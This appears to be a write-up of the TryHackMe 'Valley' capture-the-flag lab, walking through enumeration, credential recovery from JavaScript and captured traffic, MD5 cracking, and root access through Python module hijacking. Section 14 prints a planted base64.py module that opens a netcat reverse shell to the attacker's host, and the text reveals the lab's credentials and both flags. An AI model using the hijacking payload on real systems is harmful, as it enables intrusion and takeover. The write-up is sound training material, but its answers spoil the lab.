# 🏔️ TryHackMe — Valley

> **Linux Enumeration | Web Enumeration | FTP | PCAP Analysis | SSH | Linux Privilege Escalation | Python Module Hijacking**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%20SSH%20%7C%20FTP-008cc1?style=flat-square&labelColor=555555)
![Web](https://img.shields.io/badge/Web-Enumeration-6f42c1?style=flat-square&labelColor=555555)
![PCAP](https://img.shields.io/badge/Network-PCAP%20Analysis-e67e22?style=flat-square&labelColor=555555)
![Privilege Escalation](https://img.shields.io/badge/Privilege%20Escalation-Python%20Module%20Hijacking-e63946?style=flat-square&labelColor=555555)

---

## 📖 Overview

The **Valley** room on TryHackMe is a Linux-based boot-to-root penetration testing lab. The objective is to enumerate the target, identify weaknesses in the exposed services, obtain initial access, and ultimately escalate privileges to root.
The attack involves multiple stages, including web enumeration, discovery of developer resources, FTP enumeration, PCAP analysis, credential discovery, SSH access, Linux enumeration, cron-job analysis, and Python module hijacking.

The overall attack chain is:

```text
Web Enumeration
      ↓
Hidden Developer Resources
      ↓
Exposed Credentials
      ↓
FTP Access
      ↓
PCAP Analysis
      ↓
Credential Discovery
      ↓
SSH Access
      ↓
valleyDev
      ↓
User Flag
      ↓
User Enumeration
      ↓
valleyAuthenticator
      ↓
Credential Recovery
      ↓
valley User
      ↓
Cron Enumeration
      ↓
Python Module Hijacking
      ↓
Root Shell
      ↓
Root Flag
```

---

# 🎯 Objectives

The main objectives of this lab were:

- Perform network enumeration using **Nmap**.
- Identify open ports and running services.
- Enumerate the target web application.
- Discover hidden directories and developer resources.
- Inspect JavaScript files for exposed credentials.
- Enumerate the FTP service.
- Download and analyze PCAP files.
- Use **Wireshark** to inspect captured HTTP traffic.
- Recover credentials from network traffic.
- Obtain initial access through **SSH**.
- Enumerate users and files on the Linux system.
- Analyze the ```valleyAuthenticator``` binary.
- Recover credentials for another local user.
- Enumerate scheduled tasks and cron jobs.
- Identify a root-owned Python script.
- Understand Python module import behavior.
- Exploit **Python module hijacking** for privilege escalation.
- Obtain root-level access.
- Retrieve both the user and root flags.

---

# 🔎 1. Initial Enumeration

I started with a full TCP port scan and service/version detection.
```
nmap -sV -p- 10.48.181.236
```
The scan revealed:
```
22/tcp     open  ssh
80/tcp     open  http
37370/tcp  open  ftp
```
The target was running Ubuntu, with Apache on port 80 and vsFTPd on port 37370.

<img width="864" height="235" alt="1" src="https://github.com/user-attachments/assets/3edc8e11-c806-468e-8651-cdff6c175133" />

---

# 🌐 2. Web Enumeration

I opened the web application on port 80 and then used Gobuster to enumerate directories.
```
gobuster dir -u http://10.48.181.236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Interesting paths included:
```
/gallery/
/static/
/pricing/
```
<img width="1039" height="623" alt="2" src="https://github.com/user-attachments/assets/bf6afd74-6275-485b-bd9e-1239f9cf815d" />
<img width="862" height="335" alt="3" src="https://github.com/user-attachments/assets/59422c25-a7d3-4cd8-afec-be9e738dad70" />

---

# 3. Enumerating /static

I also enumerated the /static directory.
```
gobuster dir -u http://10.48.181.236/static -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
One of the discovered files contained developer notes.
<img width="1004" height="581" alt="4" src="https://github.com/user-attachments/assets/09d1e409-13ef-40cb-b3a1-ab89b214af48" />
<img width="648" height="202" alt="5" src="https://github.com/user-attachments/assets/99ac35ed-ad55-4137-8940-274a8dfea981" />

The notes indicated that there was a developer login and an FTP server that needed investigation.

---

# 4. Discovering the Developer Login

While inspecting the web application, I found a developer login page.

I inspected the JavaScript source associated with the login page.
```
/dev1243224123123/devjs
```

<img width="944" height="694" alt="6" src="https://github.com/user-attachments/assets/9006023c-f4ba-47cc-9b43-3bc71b961886" />

The JavaScript contained hard-coded credentials:
```
if (username === "siemDev" && password === "california") {
    window.location.href =
    "/dev1243224123123/devNotes37370.txt";
}
```
The credentials were:
```
Username: siemDev
Password: california
```
The developer notes pointed toward the FTP service.

<img width="790" height="803" alt="7" src="https://github.com/user-attachments/assets/b98012de-f4be-4db8-a41b-d86e701deec8" />
<img width="839" height="206" alt="8" src="https://github.com/user-attachments/assets/35f7e7b3-0070-4c60-b996-33c54db3b5cc" />

---

# 📡 5. FTP Enumeration

The FTP service was running on port ```37370```.
```
ftp siemDev@10.48.181.236 37370
```
After authentication, I found three PCAP files:
```
siemFTP.pcapng
siemHTTP1.pcapng
siemHTTP2.pcapng
```

<img width="619" height="282" alt="9" src="https://github.com/user-attachments/assets/d9ccd2bd-6011-46f5-a9e8-bbadbd79b5a9" />

I downloaded the files:
```
mget *
```

<img width="1233" height="336" alt="9-2" src="https://github.com/user-attachments/assets/3c8aee50-e087-405f-b830-91aca45a0924" />

---

# 🦈 6. Analyzing the PCAP Files

I opened the captured traffic in Wireshark.

The HTTP traffic contained form data, including a password.

The request revealed:
```
psw=ph0t0s1234
```
This demonstrated why the PCAP files were important: sensitive credentials had been transmitted through captured HTTP traffic.

<img width="857" height="572" alt="10" src="https://github.com/user-attachments/assets/40782bdd-ee3e-40c4-a93e-5440c2bed84f" />

---

# 💻 7. SSH Access as ```valleyDev```

Using the credentials discovered during the traffic analysis, I obtained SSH access as ```valleyDev```.
```
ssh valleyDev@10.48.181.236
```
I checked the home directory and found ```user.txt```.
```
ls
cat user.txt
```
The user flag was:
```
THM{k@L1_1n_th3_valley}
```

<img width="741" height="428" alt="11" src="https://github.com/user-attachments/assets/1998ff2f-fb4d-40d9-b6ac-9b57804f5b7c" />
<img width="311" height="43" alt="12" src="https://github.com/user-attachments/assets/32938ba9-4ddc-418e-b90b-b71436589806" />

---

# 🐧 8. Checking Sudo Permissions

I checked whether ```valleyDev``` could execute commands with sudo.
```
sudo -l
```
The result showed that ```valleyDev``` did not have sudo privileges.

I also enumerated the ```/home``` directory and noticed another user:
```
siemDev
valley
valleyDev
```

<img width="613" height="217" alt="13" src="https://github.com/user-attachments/assets/5230f5fb-9315-47ca-9fb5-2647b28d2843" />

---

# 🔬 9. Finding ```valleyAuthenticator```

Further enumeration revealed an additional service exposing a binary named:
```
valleyAuthenticator
```
I downloaded it for local analysis:
```
wget 10.48.181.236:8000/valleyAuthenticator
```

<img width="929" height="287" alt="14" src="https://github.com/user-attachments/assets/e8ad8bf7-f6bc-46d2-aadb-22891eb5d6a6" />

I then extracted readable strings from the binary:
```
strings valleyAuthenticator > valley.txt
```
Among the extracted data was an MD5 hash:
```
e6722920bab2326f8217e4bf6b1b58ac
```

<img width="580" height="200" alt="15" src="https://github.com/user-attachments/assets/441c4e08-0190-4026-b0b7-f889322c79b9" />

---

# 🔐 10. Cracking the MD5 Hash

I identified the hash as MD5 and cracked it.

The recovered password was:
```
Liberty123
```

<img width="911" height="339" alt="16" src="https://github.com/user-attachments/assets/3bc66616-356c-4eeb-bcac-02547a2c1a24" />

---

# 11. Switching to the ```valley``` User

I used the recovered password to switch to the ```valley``` account.
```
su valley
```
After authentication:
```
whoami
```
returned:
```
valley
```
I again checked sudo privileges:
```
sudo -l
```
The account did not have direct sudo access.

<img width="411" height="93" alt="17" src="https://github.com/user-attachments/assets/6bd3a1e6-1ca0-45f1-a7ab-3aac942b5fa1" />

---

# 12. Enumerating Cron Jobs

Since direct sudo escalation was unavailable, I inspected scheduled tasks.
```
cat /etc/crontab
```
A particularly interesting entry executed a Python script as root:
```
root python3 /photos/script/photosEncrypt.py
```
This was important because the script was executed with root privileges.

<img width="641" height="387" alt="18" src="https://github.com/user-attachments/assets/03338005-0c82-4f92-93c1-ae1180ab38a8" />

---

# 🔑 13. Analyzing ```photosEncrypt.py```

I inspected the script:
```
cat /photos/script/photosEncrypt.py
```
The script imported Python's ```base64``` module:
```
import base64
```
and used it to encode images.

The cron job therefore provided an opportunity to investigate Python module loading.

<img width="546" height="346" alt="19" src="https://github.com/user-attachments/assets/79ad777c-a012-43c0-8560-cf9d2e0bc1a4" />

---

# 🐍 14. Python Module Hijacking

I searched the system for the ```base64``` module.
```
locate base64
```
The key idea was that Python imports modules based on its module search path.

If an attacker can place a malicious module with the same name in a location searched before the legitimate module, the malicious code can be executed.

For the lab, I prepared a malicious ```base64.py``` that executes a reverse shell when imported.

import os
```
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.132.194 4848 >/tmp/f')
```
The important point is that the cron job executes the Python script as root, so code executed during the import can inherit ```root``` privileges.

<img width="667" height="435" alt="20" src="https://github.com/user-attachments/assets/6aafd372-0b6d-41a9-80fa-ac3aee52286a" />
<img width="825" height="152" alt="21" src="https://github.com/user-attachments/assets/f3387a33-1366-448e-8ef2-49a8b7610de6" />

---

# 15. Catching the Root Shell

On my Kali machine, I started a Netcat listener:
```
nc -lvnp 4848
```
When the cron job executed the malicious module, the connection returned a shell.

I verified the privilege level:
```
whoami
```
Output:
```
root
```
<img width="583" height="116" alt="22" src="https://github.com/user-attachments/assets/d2d6b4d2-bed3-492a-882b-b72b9695e5d7" />

# 👑 16. Root Flag

Finally, I read the root flag:
```
cat /root/root.txt
```
```
THM{valley_Of_th3_shadow_Of_priv3sc}
```
<img width="330" height="38" alt="23" src="https://github.com/user-attachments/assets/62643435-38f4-4f99-8782-158e0021f834" />

